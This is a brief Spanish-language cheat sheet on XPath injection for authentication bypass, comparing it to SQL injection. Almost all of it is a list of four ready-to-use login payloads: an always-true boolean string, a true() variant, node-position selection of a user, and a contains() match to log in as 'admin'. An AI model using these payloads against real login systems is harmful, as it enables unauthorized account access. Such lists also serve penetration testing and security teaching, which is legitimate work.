## Authentication bypass

El xpath injection funciona parecido a las SQLI (es como una prima). Posee una sintaxis diferente y aborda los indexes de nodos dentro de un xml.

#### Bypass mediante boolean simple:

    admin' or '1'='1

#### Bypass mediante un true absoluto

    ' or true() or '

#### Buscar un usuario por index de nodo para el logueo

    ' or position()=2 or '

#### Bypass buscando un usuario específico:

    ' or contains(.,'admin') or '


